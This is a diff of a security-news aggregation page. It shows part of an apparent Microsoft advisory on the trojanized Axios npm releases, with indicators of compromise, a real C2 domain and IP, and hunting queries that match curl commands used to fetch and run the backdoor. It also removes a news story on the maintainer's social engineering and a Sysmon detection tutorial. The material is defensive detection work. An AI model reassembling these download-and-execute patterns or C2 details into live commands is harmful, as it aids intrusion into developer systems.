+# Dependabot example ignore: - dependency-name: "axios" |
+- Check for malicious Axios versions in the organization to ensure that workflows and systems don’t use compromised Axios versions (1.14.1 and 0.30.4).
+- Assess the potential blast radius from affected endpoints
+- The Exposure Management graph provides a unified representation of organizational assets and their relationships, including identities, endpoints, cloud resources and secrets. This graph is also exposed to customers through Advanced Hunting in Microsoft Defender, enabling programmatic exploration of these connections.
+- Using advanced hunting, security teams can query this graph to assess the potential blast radius of any given node, such as a server affected by the RAT. By understanding which assets are reachable through existing permissions and trust relationships, organizations can prioritize remediation of the most critical exposure paths.
+- Additional examples and query patterns are available here as well as in the hunting queries section.
+Microsoft Defender detections
+[Microsoft Defender](https://www.microsoft.com/security/business/microsoft-defender) customers can refer to the list of applicable detections below. Durable detections that were already in place alerted and protected customers from this attack. We have also released additional protections to detect and block specific malicious components.
+Microsoft Defender coordinates detection, prevention, investigation, and response across endpoints, identities, email, apps to provide integrated protection against attacks like the threat discussed in this blog.
+| Tactic | Observed activity | Microsoft Defender coverage (Blocking detections are indicated where applicable and mapped to specific IoCs, components, or TTPs.) |
+| Initial Access, Execution | The postinstall script downloads the payload from the attacker-controlled server. | Microsoft Defender for Cloud – Malicious Axios supply chain activity detected |
+| Initial execution script was included in setup.js – plain-crypto-js-4.2.1.tgz and is responsible for launching the malicious chain during install or first run | Microsoft Defender for Endpoint – Trojan:Script/SuspObfusRAT.A (Blocking) | |
+| Initial execution script setup.js was responsible for launching the malicious chain during install or first run | Microsoft Defender for Endpoint – TrojanDownloader:JS/Crosdomd.A (Blocking) | |
+| Maliciously packaged crypto library plain-crypto-js@4.2.1 used to execute or support attacker‑controlled logic in a supply‑chain compromise. | Microsoft Defender for Endpoint – Trojan:JS/AxioRAT.DA!MTB (Blocking) | |
+| Execution (macOS) | macOS persistence artifact /Library/Caches/com.apple.act.mond launched, masquerading as a legitimate Apple component to maintain stealthy execution. | Microsoft Defender for Endpoint – Trojan:MacOS/Multiverze!rfn (Blocking) – Backdoor:MacOS/TalonStrike.A!dha (Blocking) – Backdoor:MacOS/Crosdomd.A (Blocking) – Behavior:MacOS/SuspNukeSpedExec.B (Blocking) – Behavior:MacOS/SuspiciousActivityGen.AE (Blocking) |
+| Download and execution of payload | Microsoft Defender for Endpoint – Trojan:Script/SuspObfusRAT.A (Blocking) – Trojan:JS/AxioRAT.DA!MTB (Blocking) – Trojan:MacOS/Multiverze!rfn (Blocking) – Behavior:MacOS/SuspNukeSpedExec.B – Behavior:MacOS/SuspiciousActivityGen.AE – Process launched in the background – Suspicious AppleScript activity – Suspicious script launched – Suspicious shell command execution – Suspicious file or content ingress – Executable permission added to file or directory – Suspicious file dropped and launched | |
+| Execution (Linux) | Download and execution of payload, /tmp/ld.py, a Python loader/downloader used to fetch, decrypt, or launch additional malicious components. | Microsoft Defender for Endpoint – Trojan:Python/TalonStrike.C!dha (Blocking) – Backdoor:Python/TalonStrike.C!dha (Blocking) |
+| Download and execution of payload | Microsoft Defender for Endpoint – Trojan:Python/TalonStrike.C!dha (Blocking) – Process launched in the background – Suspicious communication with a remote target | |
+| Execution (Windows) | Observed artifacts, 6202033.ps1 and system.bat, provided attackers persistent remote access, command execution, and follow‑on payload delivery on Windows system | Microsoft Defender for Endpoint – TrojanDownloader:PowerShell/Powdow.VUE!MTB (Blocking) – Trojan:Win32/Malgent (Blocking) – TrojanDownloader:PowerShell/Crosdomd.B (Blocking) – TrojanDownloader:PowerShell/Crosdomd.A (Blocking) – TrojanDownloader:BAT/TalonStrike.F!dha (Blocking) – Backdoor:PowerShell/TalonStrike.B!dha (Blocking) |
+| Download and execution of payload, 6202033.ps1. | Microsoft Defender for Endpoint – TrojanDownloader:PowerShell/Powdow.VUE!MTB (Blocking) – Trojan:Win32/Malgent (Blocking) – Behavior:Win32/PSMasquerade.A – Suspicious ASEP via registry key – System executable renamed and launched – Possible initial access from an emerging threat | |
+| Defense evasion (macOS) | Removal of indicators | Microsoft Defender for Endpoint – Suspicious path deletion |
+| Command and control | Use of the following network indicators for C2 communications: C2 domain: sfrclak[.]com C2 IP: 142.11.206[.]73 C2 URL: hxxp://sfrclak[.]com:8000/6202033 | Microsoft Defender for Endpoint network protection and Microsoft Defender SmartScreen block malicious network indicators observed in the attack. |
+Indicators of compromise
+| Indicator | Type | Description |
+Sfrclak[.]com | C2 domain | Resolves to 142.11.206[.]73. Registrar: NameCheap, Inc |
+142.11.206[.]73 | C2 IP | Sapphire Sleet C2 IP. Port 8000, HTTP |
+hxxp://sfrclak[.]com:8000/6202033 | C2 URL | Static path across all variants |
+%TEMP%\6202033.vbs | Windows VBScript dropper | Created by node setup.js |
+%TEMP%\6202033.ps1 | Windows PowerShell payload | Downloaded from C2, self-deleting SHA-256: ed8560c1ac7ceb6983ba995124d5917dc1a00288912387a6389296637d5f815c SHA-256: 617b67a8e1210e4fc87c92d1d1da45a2f311c08d26e89b12307cf583c900d101 |
+%PROGRAMDATA%\system.bat
+| File created by PowerShell | SHA-256: f7d335205b8d7b20208fb3ef93ee6dc817905dc3ae0c10a0b164f4e7d07121cd |
+C:\ProgramData\wt.exe | Windows LOLBin | Windows Terminal copy, used as PowerShell proxy |
+/Library/Caches/com.apple.act.mond | macOS binary | SHA-256: 92ff08773995ebc8d55ec4b8e1a225d0d1e51efa4ef88b8849d0071230c9645a |
+/tmp/ld.py | Linux loader | SHA-256: fcb81618bb15edfdedfb638b4c08a2af9cac9ecfa551af135a8402bf980375cf |
+packages.npm.org/product1 | npm identifier (Windows) | Sent as POST body to C2 |
+packages.npm.org/product0 | npm identifier (macOS) | Sent as POST body to C2 |
+Hunting queries
+Microsoft Defender XDR
+Microsoft Defender XDR customers can run the following [advanced hunting](https://learn.microsoft.com/defender-xdr/advanced-hunting-overview) queries to find related activity in their networks:
+Installed Node.js packages with malicious versions
+DeviceTvmSoftwareInventory | where (SoftwareName has "axios" and SoftwareVersion in ("1.14.1.0", "0.30.4.0")) or (SoftwareName has "plain-crypto-js" and SoftwareVersion == "4.2.1.0") |
+Detect the RAT dropper and subsequent download and execution
+CloudProcessEvents | where ProcessCurrentWorkingDirectory endswith '/node_modules/plain-crypto-js' and (ProcessCommandLine has_all ('plain-crypto-js','node setup.js')) or ProcessCommandLine has_all ('/tmp/ld.py','sfrclak.com:8000') |
+Connection to known C2
+DeviceNetworkEvents | where Timestamp > ago(2d) | where RemoteUrl contains "sfrclak.com" | where RemotePort == "8000" |
+Curl execution to download the backdoor
+DeviceProcessEvents | where Timestamp > ago(2d) | where (FileName =~ "cmd.exe" and ProcessCommandLine has_all ("curl -s -X POST -d", "packages.npm.org", "-w hidden -ep", ".ps1", "& del", ":8000")) or (ProcessCommandLine has_all ("curl", "-d packages.npm.org/", "nohup", ".py", ":8000/", "> /dev/null 2>&1") and ProcessCommandLine contains "python") or (ProcessCommandLine has_all ("curl", "-d packages.npm.org/", "com.apple.act.mond", "http://",":8000/", "&> /dev/null")) |
+Microsoft Sentinel
+Microsoft Sentinel customers can use the TI Mapping analytics (a series of analytics all prefixed with ‘TI map’) to automatically match the indicators mentioned in this blog post with data in their workspace. If the TI Map analytics are not currently deployed, customers can install the Threat Intelligence solution from the [Microsoft Sentinel Content Hub](https://learn.microsoft.com/azure/sentinel/sentinel-solutions-deploy) to have the analytics rule deployed in their Sentinel workspace.
+The following queries use [Sentinel Advanced Security Information Model (ASIM) functions](https://learn.microsoft.com/azure/sentinel/normalization) to hunt threats across both Microsoft first-party and third-party data sources. ASIM also supports deploying parsers to specific workspaces [from GitHub](https://aka.ms/DeployASIM), using an ARM template or manually.
+Detect network IP and domain indicators of compromise using ASIM
+The following query checks IP addresses and domain IOCs across data sources supported by ASIM network session parser.
+//IP list and domain list- _Im_NetworkSession let lookback = 30d; let ioc_ip_addr = dynamic(['142.11.206.73']); let ioc_domains = dynamic(["http://sfrclak.com:8000", "http://sfrclak.com"]); _Im_NetworkSession(starttime=todatetime(ago(lookback)), endtime=now()) | where DstIpAddr in (ioc_ip_addr) or DstDomain has_any (ioc_domains) | summarize imNWS_mintime=min(TimeGenerated), imNWS_maxtime=max(TimeGenerated), EventCount=count() by SrcIpAddr, DstIpAddr, DstDomain, Dvc, EventProduct, EventVendor |
+Detect Web Sessions IP and domain indicators of compromise using ASIM
+The following query checks IP addresses, domains, and file hash IOCs across data sources supported by ASIM web session parser.
+//IP list - _Im_WebSession let lookback = 30d; let ioc_ip_addr = dynamic(['142.11.206.73']); _Im_WebSession(starttime=todatetime(ago(lookback)), endtime=now()) | where DstIpAddr in (ioc_ip_addr) | summarize imWS_mintime=min(TimeGenerated), imWS_maxtime=max(TimeGenerated), EventCount=count() by SrcIpAddr, DstIpAddr, Url, Dvc, EventProduct, EventVendor // Domain list - _Im_WebSession let ioc_domains = dynamic(["http://sfrclak.com:8000", "http://sfrclak.com"]); _Im_WebSession (url_has_any = ioc_domains) |
+Microsoft Defender for Cloud
+Possibly compromised packages
+Microsoft Defender for Cloud customers can use [cloud security explorer](https://learn.microsoft.com/azure/defender-for-cloud/how-to-manage-cloud-security-explorer) to surface possibly compromised software packages. The following screenshot represents a query that searches for container images with the axios or plain-crypto-js node packages.
+Threat intelligence reports
+Microsoft Defender XDR customers can use the following [threat analytics](https://learn.microsoft.com/defender-xdr/threat-analytics) reports in the Defender portal (requires license for at least one Defender XDR product) to get the most up-to-date information about the threat actor, malicious activity, and techniques discussed in this blog. These reports provide intelligence, protection information, and recommended actions to prevent, mitigate, or respond to associated threats found in customer environments:
+[Activity profile: Mitigating the Axios npm supply chain compromise](https://security.microsoft.com/threatanalytics3/22b71a55-3c2a-4634-856d-0e937a95834b/overview)[Threat profile overview: North Korea state-sponsored activity](https://security.microsoft.com/threatanalytics3/b24de28e-e504-4266-ae56-902d1abed27c/overview?)[Technique profile: Malicious npm lifecycle scripts](https://security.microsoft.com/threatanalytics3/abc7c39c-4ca0-4325-bcbf-18a3bc8fab01/overview)[Actor profile: Sapphire Sleet](https://security.microsoft.com/threatanalytics3/5ab8c4d1-be7d-4ef9-88b0-6e4f8c356f84/overview)
+Microsoft Security Copilot customers can also use the [Microsoft Security Copilot integration](https://learn.microsoft.com/defender/threat-intelligence/security-copilot-and-defender-threat-intelligence?bc=%2Fsecurity-copilot%2Fbreadcrumb%2Ftoc.json&toc=%2Fsecurity-copilot%2Ftoc.json#turn-on-the-security-copilot-integration-in-defender-ti) in Microsoft Defender Threat Intelligence, either in the Security Copilot standalone portal or in the [embedded experience](https://learn.microsoft.com/defender/threat-intelligence/using-copilot-threat-intelligence-defender-xdr) in the Microsoft Defender portal to get more information about this threat actor.
+Microsoft Security Copilot
+[Microsoft Security Copilot](https://www.microsoft.com/en-us/security/business/ai-machine-learning/microsoft-security-copilot) is [embedded in Microsoft Defender](https://learn.microsoft.com/defender-xdr/security-copilot-in-microsoft-365-defender) and provides security teams with AI-powered capabilities to summarize incidents, analyze files and scripts, summarize identities, use guided responses, and generate device summaries, hunting queries, and incident reports.
+Customers can also [deploy AI agents](https://learn.microsoft.com/defender-xdr/security-copilot-agents-defender), including the following [Microsoft Security Copilot agents](https://learn.microsoft.com/copilot/security/agents-overview), to perform security tasks efficiently:
+[Threat Intelligence Briefing agent](https://learn.microsoft.com/defender-xdr/threat-intel-briefing-agent-defender)[Phishing Triage agent](https://learn.microsoft.com/defender-xdr/phishing-triage-agent)[Threat Hunting agent](https://learn.microsoft.com/defender-xdr/advanced-hunting-security-copilot-threat-hunting-agent)[Dynamic Threat Detection agent](https://learn.microsoft.com/defender-xdr/dynamic-threat-detection-agent)
+Security Copilot is also available as a [standalone experience](https://learn.microsoft.com/en-us/copilot/security/experiences-security-copilot) where customers can perform specific security-related tasks, such as incident investigation, user analysis, and vulnerability impact assessment. In addition, Security Copilot offers [developer scenarios](https://learn.microsoft.com/copilot/security/developer/custom-agent-overview) that allow customers to build, test, publish, and integrate AI agents and plugins to meet unique security needs.
+Learn more
+For the latest security research from the Microsoft Threat Intelligence community, check out the [Microsoft Threat Intelligence Blog](https://aka.ms/threatintelblog).
+To get notified about new publications and to join discussions on social media, follow us on [LinkedIn](https://www.linkedin.com/showcase/microsoft-threat-intelligence), [X (formerly Twitter)](https://x.com/MsftSecIntel), and [Bluesky](https://bsky.app/profile/threatintel.microsoft.com).
+To hear stories and insights from the Microsoft Threat Intelligence community about the ever-evolving threat landscape, listen to the [Microsoft Threat Intelligence podcast](https://thecyberwire.com/podcasts/microsoft-threat-intelligence).</div>
             <br>
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
         </div>
-        <div id="art-4" class="article-body">
-            <h2 class="article-title">UNC1069 Social Engineering of Axios Maintainer Led to npm Supply Chain Attack</h2>
-            <p class="source-link">Source: The Hacker News | <a href="https://thehackernews.com/2026/04/unc1069-social-engineering-of-axios.html" target="_blank">Original Link</a></p>
-            <div class="content-text">The maintainer of the Axios npm package has confirmed that the supply chain compromise was the result of a highly-targeted social engineering campaign orchestrated by North Korean threat actors tracked as [UNC1069](https://thehackernews.com/2026/04/google-attributes-axios-npm-supply.html).
-Maintainer Jason Saayman said the attackers tailored their social engineering efforts "specifically to me" by first approaching him under the guise of the founder of a legitimate, well-known company.
-"They had cloned the company's founders' likeness as well as the company itself," Saayman [said](https://github.com/axios/axios/issues/10636) in a post-mortem of the incident. "They then invited me to a real Slack workspace. This workspace was branded to the company's CI and named in a plausible manner. The Slack [workspace] was thought out very well; they had channels where they were sharing LinkedIn posts."
-Subsequently, the threat actors are said to have scheduled a meeting with him on Microsoft Teams. Upon joining the fake call, he was presented with a fake error message that stated "something on my system was out of date." As soon as the update was triggered, the attack led to the deployment of a remote access trojan.
-The access afforded by the trojan enabled the attackers to steal the npm account credentials necessary to publish two trojanized versions of the Axios npm package (1.14.1 and 0.30.4) containing an implant named WAVESHAPER.V2.
-"Everything was extremely well coordinated, looked legit, and was done in a professional manner," Saayman added.
-The attack chain described by the project maintainer shares [considerable overlaps](https://thehackernews.com/2026/02/north-korea-linked-unc1069-uses-ai.html) with tradecraft associated with UNC1069 and BlueNoroff. Details of the campaign were extensively documented by [Huntress](https://thehackernews.com/2025/06/bluenoroff-deepfake-zoom-scam-hits.html) and [Kaspersky](https://thehackernews.com/2025/10/researchers-expose-ghostcall-and.html) last year, with the latter tracking it under the moniker GhostCall.
-| Source: Kaspersky |
-In these attacks, users are displayed an error message seconds after joining the call, stating that their system is not functioning properly and instructing them to download a malicious Zoom or Teams SDK through a [ClickFix](https://thehackernews.com/2025/08/clickfix-malware-campaign-exploits.html)-like pop-up message. Depending on the operating system of the victim, this action leads to the execution of an AppleScript (for macOS) or a PowerShell (for Windows) script.
-One of the malicious payloads deployed as part of the attack chain is a Nim-based macOS backdoor (or a Go variant written for Windows) called CosmicDoor that delivers a comprehensive stealer suite dubbed SilentSiphon to capture credentials from web browsers and password managers, and secrets associated with GitHub, GitLab, Bitbucket, npm, Yarn, Python pip, RubyGems, Rust argo, and .NET NuGet.
-As [detailed](https://thehackernews.com/2026/04/unc1069-social-engineering-of-axios.html) by Google-owned Mandiant in February 2026, some of these attacks have also have paved the way for the deployment of a C++ malware called WAVESHAPER, which then serves as a conduit for additional downloaders, backdoors, and information stealers like HYPERCALL, SUGARLOADER, HIDDENCALL, SILENCELIFT, and DEEPBREATH, and CHROMEPUSH.
-"Historically, [...] these specific guys have gone after crypto founders, VCs, public people," security researcher Taylor Monahan said. "They [social engineer](https://fortune.com/2026/04/02/north-korea-dprk-zoom-phishing-social-engineering-attack-telegram/) them and take over their accounts and target the next round of people. This evolution to targeting [OSS maintainers] is a bit concerning in my opinion."
-As preventive steps, Saayman has outlined several changes, including resetting all devices and credentials, setting up immutable releases, adopting OIDC flow for publishing, and updating GitHub Actions to adopt best practices.
-The findings demonstrate how open-source project maintainers are increasingly becoming the target of sophisticated attacks, effectively allowing threat actors to target downstream users at scale by publishing poisoned versions of highly popular packages.
-With Axios attracting nearly 100 million weekly downloads and being used heavily across the JavaScript ecosystem, the blast radius of such a supply chain attack can be massive as it propagates swiftly through direct and transitive dependencies.
-"A package as widely used as Axios being compromised shows how difficult it is to reason about exposure in a modern JavaScript environment," Socket's Ahmad Nassri [said](https://socket.dev/blog/hidden-blast-radius-of-the-axios-compromise#Why-the-Blast-Radius-Is-Larger-Than-It-Looks). "It is a property of how dependency resolution in the ecosystem works today."
-Axios Attack Part of Broader, Coordinated Campaign
-In a follow-up analysis published on Friday, Socket [said](https://socket.dev/blog/attackers-hunting-high-impact-nodejs-maintainers) several maintainers across the Node.js ecosystem have come forward to report that they were targeted in a similar manner, indicating that high-impact, open-source project maintainers were unsuccessfully targeted as part of what has been described as a coordinated social engineering campaign.
-"The attack chain: build rapport over weeks, schedule a video call, fake an audio error, prompt the target to install a 'fix.'" Socket CEO Feross Aboukhadijeh [said](https://x.com/feross/status/2040182994699473106). "That fix is a RAT. Once it's on your machine, they have your .npmrc tokens, browser sessions, AWS creds, andKeychain. 2FA doesn't matter. OIDC publishing doesn't matter. Game over."
-Targets included Socket's own engineers, [Jordan Harband](https://github.com/ljharb), who maintains ECMAScript polyfills and shims, and [John-David Dalton](https://github.com/jdalton), who is the creator of Lodash, a popular JavaScript utility library that offers methods to handle arrays, objects, and other types of data. Also targeted were Matteo Collina, the lead maintainer of Fastify, Pino, and Undici, Scott Motte, the creator of dotenv, and Pelle Wessman, who is a maintainer of mocha, neostandard, npm-run-all2, and type-fest.
-While initial contact with Collina was via a Slack message, Wessman was invited to participate in a podcast recording, as part of which he was instructed to join a video call that turned out to be a fake version of the Streamyard live recording platform.
-Once the call began, the bogus site displayed a "technically plausible error message" and prompted Wessman to download a native app to resolve it. When Wessman refused to run it, the North Korean threat actors switched tactics and asked him to run a curl command in the Terminal app. Having failed in this effort too, they erased all conversations and went dark.
-In another case documented by Jean Burellier, a Node.js core collaborator and contributor to Express, the social engineering effort began with a LinkedIn message from the threat actors, posing as the representative of a company named Openfort. After the initial trust-building exercise, Burellier was invited to join two Slack workspaces. As soon as he joined, he was placed in a private channel with no other visible members and invited to join a fake Microsoft Teams call.
-From here, the attack chain mirrors that of what Huntress, Kaspersky, and Google documented, with the fake Teams page displaying a message to update the Teams SDK. When Burellier declined to install the update and suggested rescheduling the call, he was removed from the Slack workspaces, and the conversations were deleted.
-"The accounts now span some of the most widely depended-upon packages in the npm registry and Node.js core itself, and together they confirm that Axios was not a one-off target," the software supply chain security company said. "It was part of a coordinated, scalable attack pattern aimed at high-trust, high-impact open source maintainers."
-(The story was updated after publication on April 4, 2026, to reflect the latest developments.)
-[Google News](https://news.google.com/publications/CAAqLQgKIidDQklTRndnTWFoTUtFWFJvWldoaFkydGxjbTVsZDNNdVkyOXRLQUFQAQ),</div>
-            <br>
-            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
-            <hr class="separator">
-        </div>
-        <div id="art-5" class="article-body">
+        <div id="art-7" class="article-body">
             <h2 class="article-title">North Korea-Nexus Threat Actor Compromises Widely Used Axios NPM Package in Supply Chain Attack</h2>
             <p class="source-link">Source: Threat Intelligence | <a href="https://cloud.google.com/blog/topics/threat-intelligence/north-korea-threat-actor-targets-axios-npm-package/" target="_blank">Original Link</a></p>
             <div class="content-text">North Korea-Nexus Threat Actor Compromises Widely Used Axios NPM Package in Supply Chain Attack
@@ -550,432 +813,7 @@ Wiz customers should check their Wiz Threat Center for information on this advis
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
         </div>
-        <div id="art-6" class="article-body">
-            <h2 class="article-title">Building a Detection Foundation: Part 4 - Sysmon</h2>
-            <p class="source-link">Source: TrustedSec | <a href="https://trustedsec.com/blog/building-a-detection-foundation-part-4-sysmon" target="_blank">Original Link</a></p>
-            <div class="content-text">Building a Detection Foundation: Part 4 - Sysmon
-Table of contents
-Filling the Gaps Native Logging Can't
-At this point in our series, we have Windows Security events capturing logon sessions and process creation, and PowerShell logging capturing script execution. That's a solid foundation. But if you've worked Incident Response, you've hit the walls of native logging:
-- "We know PowerShell ran, but what did it connect to?"
-- "Something modified this registry key, but we don't know which process."
-- "A malicious DLL was loaded—when? By what?"
-This is where Sysmon enters the picture. Sysmon, a free Windows system service and driver from Microsoft [Sysinternals](https://learn.microsoft.com/en-us/sysinternals/) that monitors and logs system activity to the Windows event log, is soon to be included in the latest versions of Windows Server and Windows 11. It's not a replacement for native logging—it's a complement that provides telemetry Windows simply doesn't offer natively.
-I do have a small bias since I have been writing about the tool since it came out, given multiple training classes on it, and wrote most of the [Sysmon Community Guide](https://github.com/trustedsec/SysmonCommunityGuide), but I do see where it falls short and will do my best to cover some of the basics. Do check the [resources](#Resources) at the end of this blog to go deeper on how to leverage the tool.
-What Sysmon Provides
-Looking back at our [MITRE ATT&CK](https://attack.mitre.org/) data source coverage, here's where Sysmon fills critical gaps:
-Data Component | Technique Coverage | Sysmon Event |
-|---|---|---|
-Process Creation | 452 | Event 1 (enhanced parent info, hashes) |
-Network Connection Creation | 151 | Event 3 |
-Module Load | 109 | Event 7 |
-Windows Registry Key Modification | 86 | Events 12, 13, 14 |
-Process Access | 77 | Event 10 |
-File Creation | 174 | Event 11 |
-Driver Load | 14 | Event 6 |
-WMI Operations | 7 | Events 19, 20, 21 |
-Named Pipe | 4 | Events 17, 18 |
-DNS Queries | — | Event 22 |
-Let me walk through the Sysmon events you should care about and why.
-Essential Sysmon Events
-Event 1: Process Creation
-Yes, we have Event ID 4688 from native logging. So why use Sysmon Event 1?
-What Sysmon adds:
-- File hashes (MD5, SHA1, SHA256) of the executable
-- More reliable parent process information
-- Parent command line
-- Integrity level
-- More consistent formatting
-Detection value:
-- Hash lookups for known-bad binaries
-- Detecting renamed legitimate tools (hash matches, name doesn't)
-- Process tree reconstruction
-Event 3: Network Connection
-This is huge. Native Windows logging does not provide a reliable way to track which process connected to which IP address. Sysmon Event 3 captures:
-- Source IP address and port
-- Destination IP address and port
-- Protocol
-- The process that initiated the connection
-- User context
-Why this matters: You see PowerShell execute. It runs a download cradle. Event 3 shows you powershell.exe connected to 192.168.1.100:443. Now you have an IOC to hunt for across other systems and network logs.
-What to prioritize:
-When configuring Event 3, I recommend focusing on two categories:
-1. C2 Channels: Ports commonly used for C2 traffic
-- SSH (22) - Often used for encrypted C2
-- HTTP (80) and HTTPS (443) - The most common C2 channels
-- DNS (53) - DNS tunneling and C2 over DNS
-2. Lateral Movement/Remote Management: Ports that indicate system-to-system access
-- RDP (3389)
-- WinRM (5985, 5986)
-- SSH (22)
-- SMB (445)
-- Telnet (23)
-- Common Remote Monitoring and Management (RMM) tools (varies by vendor—ScreenConnect, AnyDesk, TeamViewer, etc.)
-The HTTPS exclusion problem:
-Here's a challenge: every software vendor wants telemetry these days. Your environment is full of legitimate HTTPS traffic from browsers, update services, security tools, and business applications. If you log all port 443 traffic, you'll drown in noise.
-The solution is compound exclusion rules. Don't exclude based on a single field—attackers can rename their tools. Instead, build exclusions that require multiple conditions to match:
-- Image (full path) AND ParentImage (full path)
-- Or Image AND User context
-For example, don't just exclude chrome.exe.
-Exclude C:\Program Files\Google\Chrome\Application\chrome.exe
-when the parent is C:\Program Files\Google\Chrome\Application\chrome.exe
-(Chrome spawns child processes). An attacker who names their beacon chrome.exe and drops it in C:\Users\Public\
-won't match your exclusion.
-This approach takes more effort upfront but dramatically reduces your exposure to simple evasion techniques.
-Event 6: Driver Load
-Attackers load malicious drivers for kernel-level access, rootkit functionality, or to disable security tools. Event 6 captures:
-- Driver path
-- Hash
-- Signature status
-Why this matters: Recall the vulnerable driver attacks used to blind EDR? Event 6 would show that driver loading, giving you a fighting chance to detect it.
-Event 7: Image Load (DLL)
-This logs when a module (DLL) is loaded into a process and is critical for detecting:
-- DLL hijacking
-- Side-loading attacks
-- Reflective DLL injection (in some cases)
-Configuration consideration: This event is noisy. You'll want to filter aggressively—focus on non-standard paths, unsigned DLLs, specific DLLs that are known to provide attackers capabilities they need, and specific high-risk processes.
-Event 10: Process Access
-This fires when a process opens a handle to another process. This is your primary indicator for credential extraction techniques that access LSASS.
-Why this matters: Mimikatz and similar tools need to open a handle to lsass.exe with specific access rights. Event 10 captures this.
-What to watch for:
-- Any process accessing LSASS with access mask
-0x1010
-(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION) - Pay special attention to access masks
-0x1F1FFF
-or0x1FFFFF
-as these are the highest permission level and mean the memory is being extracted for the process. - Non-standard processes accessing LSASS at all
-Event 11: File Create
-Look at log file creation events. Combined with the process context, you know not just that a file was created but what created it.
-Why this matters: Malware drops payloads. Event 11 shows powershell.exe created C:\Users\Public\payload.exe. You now have the full chain. By monitoring all executable file types and critical OS locations, you can detect:
-• Malware dropping executables in system directories (C:\Windows\System32, C:\Windows\SysWOW64)
-• Persistence mechanisms placing files in startup folders
-• Driver/kernel module installations in \Windows\System32\drivers\
-• DLL hijacking attempts in system directories
-• Scripts being staged in temp directories
-• Suspicious file creation in protected Windows folders
-• Executable files created in public/shared locations that shouldn't contain them
-The comprehensive file type coverage ensures you catch all executable formats Windows supports, not just .exe files. Monitoring critical OS paths catches attackers attempting to blend in with legitimate system files or establish deep persistence.
-For additional file creation rules and examples to consider for your environment, see the [Sysmon Modular project's File Create section here](https://github.com/olafhartong/sysmon-modular/tree/master/11_file_create).
-Events 12, 13, 14: Registry Operations
-- Event 12: Registry object added or deleted
-- Event 13: Registry value set
-- Event 14: Registry object renamed
-Why this matters: Registry persistence mechanisms (Run keys, services, COM hijacking) are everywhere in attacker tradecraft. Native Windows auditing can capture registry access, but it requires complex SACL configuration. Sysmon makes it straightforward.
-Events 17, 18: Pipe Created / Pipe Connected
-Why this matters: Certain pipe names are strong indicators of malicious activity, but here's the catch: attackers can (and do) randomize their pipe names. Targeting known-bad patterns will catch commodity tooling, but sophisticated actors will slip through.
-The better approach: Rather than trying to enumerate all possible malicious pipe names, I recommend building a baseline of valid named pipes in your environment and then creating exclusions for those. Log everything else. This way, any new or unusual pipe that appears gets captured—and you handle the alerting logic at your SIEM where you have more flexibility.
-We cover both strategies in depth in the [TrustedSec Sysmon Community Guide](https://github.com/trustedsec/SysmonCommunityGuide/blob/master/chapters/named-pipes.md)—the targeted approach and the exclusion-based approach. I personally prefer the exclusion method with detection happening at the SIEM layer.
-Events 19, 20, 21: WMI Events
-- Event 19: WmiEventFilter activity
-- Event 20: WmiEventConsumer activity
-- Event 21: WmiEventConsumerToFilter activity
-Why this matters: WMI event subscriptions are a stealthy persistence mechanism. These events let you see them being created. Paired with Microsoft-WMI-Activity/Operational Event ID 5858 that logs WMI errors, Event ID 5857 for providers loaded, and Event ID 5861 for permanent events, you have full redundancy in coverage.
-Event 22: DNS Query
-This logs DNS queries with the process that made them and is critical for detecting C2 communication, DNS tunneling, and domain generation algorithms.
-Why this matters: You see powershell.exe queried evil-domain.com. Your network logs might show the DNS traffic, but without Sysmon you wouldn't know which process initiated it.
-The better approach: I will be honest. This one in client machines is painful to get a good signal-to-noise ratio (SNR), and I prefer network management platforms. On servers where there is more control, less applications loading multiple websites, and new entries on a constant basis, it is of great value however. Use it if another solution is not available, but be aware on what role the host plays before implementing it.
-A Practical Sysmon Configuration
-Below is a production-ready Sysmon configuration that balances visibility with performance. This isn't a one-size-fits-all solution, aka you should tune it for your environment, but it's a strong starting point.
-This configuration can be copied to an XML document and applied using the Sysmon.exe process on a test system. Once tuned, you can deploy the registry value using GPO or Intune, depending on your environment. I would recommend the [Learning Sysmon video series](https://www.youtube.com/playlist?list=PLk-dPXV5k8SG26OTeiiF3EIEoK4ignai7) I recorded if you are not familiar on how to do this. I go over each event type and recommendations for each.
-<?xml version="1.0" encoding="UTF-8"?>
-<Sysmon schemaversion="4.90">
-<!--
-Sysmon Configuration for Detection Foundation
-Tune exclusions based on your environment's baseline noise
--->
-<HashAlgorithms>md5,sha256,IMPHASH</HashAlgorithms>
-<DnsLookup>False</DnsLookup>
-<EventFiltering>
-<!-- Event 1: Process Creation - Log all, exclude known-noisy processes -->
-<RuleGroup name="ProcessCreate" groupRelation="or">
-<ProcessCreate onmatch="exclude">
-<!-- Tune these based on your environment -->
-<Image condition="is">C:\Windows\System32\backgroundTaskHost.exe</Image>
-<Image condition="is">C:\Windows\System32\RuntimeBroker.exe</Image>
-<Image condition="is">C:\Windows\System32\taskhostw.exe</Image>
-<ParentImage condition="is">C:\Windows\System32\svchost.exe</ParentImage>
-<!-- Add your environment-specific exclusions here -->
-</ProcessCreate>
-</RuleGroup>
-<!-- Event 3: Network Connection - Focus on C2 and lateral movement -->
-<!-- Priority: C2 channels (443, 80, 53, 22) and management ports (3389, 5985, 5986, 445, 23) -->
-<RuleGroup name="NetworkConnect" groupRelation="or">
-<NetworkConnect onmatch="include">
-<!-- C2 Channel Ports -->
-<DestinationPort condition="is">443</DestinationPort>
-<DestinationPort condition="is">80</DestinationPort>
-<DestinationPort condition="is">53</DestinationPort>
-<DestinationPort condition="is">22</DestinationPort>
-<!-- Lateral Movement / Remote Management Ports -->
-<DestinationPort condition="is">3389</DestinationPort> <!-- RDP -->
-<DestinationPort condition="is">5985</DestinationPort> <!-- WinRM HTTP -->
-<DestinationPort condition="is">5986</DestinationPort> <!-- WinRM HTTPS -->
-<DestinationPort condition="is">445</DestinationPort> <!-- SMB -->
-<DestinationPort condition="is">23</DestinationPort> <!-- Telnet -->
-<DestinationPort condition="is">135</DestinationPort> <!-- RPC -->
-<!-- Common RMM Tool Ports - adjust for tools in your environment -->
-<DestinationPort condition="is">8040</DestinationPort> <!-- ScreenConnect -->
-<DestinationPort condition="is">7070</DestinationPort> <!-- AnyDesk -->
-<DestinationPort condition="is">5938</DestinationPort> <!-- TeamViewer -->
-<!-- High-risk processes regardless of port -->
-<Image condition="end with">\powershell.exe</Image>
